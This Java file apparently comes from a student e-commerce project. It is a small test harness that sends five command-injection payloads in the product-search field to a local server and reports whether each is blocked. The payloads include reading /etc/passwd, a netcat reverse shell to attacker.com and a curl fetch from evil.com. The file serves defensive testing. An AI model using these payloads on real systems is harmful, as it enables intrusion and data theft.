package com.chrionline.server.attack;

import com.chrionline.shared.dto.Request;
import com.chrionline.shared.dto.Response;
import com.chrionline.shared.enums.Action;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

public class CommandInjectionAttacker {

    public static void main(String[] args) throws Exception {
        String host = "localhost";
        int port = 9090;

        System.out.println("[ATTACK] Command Injection test...\n");

        // Payloads d'injection commande
        String[] payloads = {
                "iPhone; cat /etc/passwd",              // Unix
                "iPhone && dir C:\\",                   // Windows
                "iPhone | nc attacker.com 4444",        // Reverse shell
                "iPhone`whoami`",                       // Substitution commande
                "iPhone$(curl http://evil.com/shell)"   // Exécution distante
        };

        try (Socket socket = new Socket(host, port);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            for (int i = 0; i < payloads.length; i++) {
                System.out.println("[ATTACK] Payload #" + (i+1) + " :");
                System.out.println("  " + payloads[i]);

                Map<String, Object> data = new HashMap<>();
                data.put("keyword", payloads[i]);

                Request req = new Request(Action.SEARCH_PRODUCTS, null, data);
                out.println(req.toJson());

                String response = in.readLine();
                Response resp = Response.fromJson(response);

                if (resp.getMessage().contains("invalides")) {
                    System.out.println("  ✅ BLOQUÉ : " + resp.getMessage());
                } else {
                    System.out.println("  ❌ PASSÉ (vulnérable) : " + resp.getMessage());
                }
                System.out.println();

                Thread.sleep(500);
            }
        }

        System.out.println("[ATTACK] Test terminé. Vérifiez les logs serveur.");
    }
}